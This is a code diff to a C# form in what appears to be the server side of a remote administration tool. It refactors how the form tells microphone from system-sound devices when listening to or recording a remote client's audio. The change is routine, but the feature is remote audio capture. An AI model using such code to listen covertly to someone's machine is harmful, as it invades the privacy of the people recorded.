@@ -25,6 +25,7 @@ namespace Comet.Server.Forms
         /// </summary>
         private readonly AudioHandler _audioHandler;
         private readonly string _baseDownloadPath;
+        GetAudioNames audioNames;
 
         public FrmAudio(Client client)
         {
@@ -48,15 +49,16 @@ namespace Comet.Server.Forms
 
         private void DisplaysChanged(object sender, GetAudioNames value)
         {
+            audioNames = value;
             foreach (var item in value?.WaveInDeviceName)
             {
-                if (item.EndsWith("M"))
+                if (item.Value== "microphone")
                 {
-                    waveInDeviceName.Items.Add(new ComboBoxItem(item, Properties.Resources.microphone));
+                    waveInDeviceName.Items.Add(new ComboBoxItem(item.Key, Properties.Resources.microphone, "microphone"));
                 }
                 else
                 {
-                    waveInDeviceName.Items.Add(new ComboBoxItem(item, Properties.Resources.loudspeaker));
+                    waveInDeviceName.Items.Add(new ComboBoxItem(item.Key, Properties.Resources.loudspeaker, "system"));
                 }
                 waveInDeviceName.SelectedIndex = 0;
             }
@@ -112,7 +114,15 @@ namespace Comet.Server.Forms
                 if (OutDevice.SelectedIndex != -1 && waveInDeviceName.SelectedIndex != -1)
                 {
                     //如果index为1则为系统声音
-                    int index = waveInDeviceName.Text.EndsWith("S") ? 1 : 0;
+                    int index = -1;
+                    foreach (var item in audioNames.WaveInDeviceName)
+                    {
+                        if (item.Key == waveInDeviceName.Text)
+                        {
+                            index = item.Value == "microphone" ? 0 : 1;
+                            break;
+                        }
+                    }
                     _audioHandler.StartListen(OutDevice.SelectedIndex, index);
                     startListen.Text = "Stop listening";
                     progressBar1.Style = ProgressBarStyle.Marquee;
@@ -154,7 +164,15 @@ namespace Comet.Server.Forms
             if (checkBox2.Checked && waveInDeviceName.SelectedIndex != -1)
             {
                 //如果index为1则为系统声音
-                int index = waveInDeviceName.Text.Substring(waveInDeviceName.Text.Length - 1) == "S" ? 1 : 0;
+                int index = -1;
+                foreach (var item in audioNames.WaveInDeviceName)
+                {
+                    if (item.Key == waveInDeviceName.Text)
+                    {
+                        index = item.Value == "microphone" ? 0 : 1;
+                        break;
+                    }
+                }
                 if (!Directory.Exists(_baseDownloadPath)) Directory.CreateDirectory(_baseDownloadPath);
                 if (index == 0)//录麦克风
                 {
@@ -222,12 +240,15 @@ namespace Comet.Server.Forms
         public class ComboBoxItem
         {
             public string Text { get; set; }
+            public string Tag { get; set; }
             public Image Image { get; set; }
+            
 
-            public ComboBoxItem(string text, Image image)
+            public ComboBoxItem(string text, Image image, string tag)
             {
                 Text = text;
                 Image = image;
+                Tag = tag;
             }
 
             public override string ToString()
